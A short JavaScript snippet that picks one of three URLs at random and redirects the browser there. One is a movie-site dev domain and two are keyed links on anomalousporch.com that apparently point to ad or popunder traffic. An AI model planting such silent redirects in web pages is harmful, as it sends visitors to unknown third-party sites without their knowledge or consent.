var dataUrl = [
'//dev-fivestarmovie.pantheonsite.io/',
'//anomalousporch.com/hh9m6iq8u?key=b1b4a076f4bf1c1aa140cc71754f0d67',
'//anomalousporch.com/s12ygwr4j?key=0c236aab12a231150e5db3f8b366197c'
];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem;
